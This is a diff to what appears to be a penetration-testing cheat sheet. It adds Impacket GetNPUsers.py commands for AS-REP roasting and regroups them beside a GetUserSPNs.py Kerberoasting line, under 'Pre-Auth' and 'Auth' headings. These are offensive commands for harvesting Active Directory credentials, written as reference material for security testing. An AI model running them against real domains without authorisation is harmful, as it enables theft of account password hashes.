@@ -127,13 +127,18 @@ https://www.youtube.com/watch?v=ctLVMi1_zBc&feature=emb_title
 
 ### [Kerberos Enumeration p88]
 ```
+Pre-Auth
+
 GetNPUsers.py WORKSTATION/ -dc-ip IP -usersfile /path/to/userslist
 GetNPUsers.py NAME.LOCAL/ -dc-ip IP -usersfile /path/to/userslist
 
 python3 GetNPUsers.py <DOMAIN/ -usersfile /path/to/users.txt -dc-ip <DCIP>
+python3 GetNPUsers.py domain.local/ -dc-ip dc-01-server.local -usersfile users.list
+python3 GetNPUsers.py <domain_name>/ -dc-ip <DC-IP> -usersfile user.list
+
+Auth
 
 python GetUserSPNs.py <domain_name>/<domain_user>:<domain_user_password> -outputfile <output_TGSs_file>
-python3 GetNPUsers.py <domain_name>/ -dc-ip <DC-IP> -usersfile user.list
 ```
 
 ### [kerbrute]
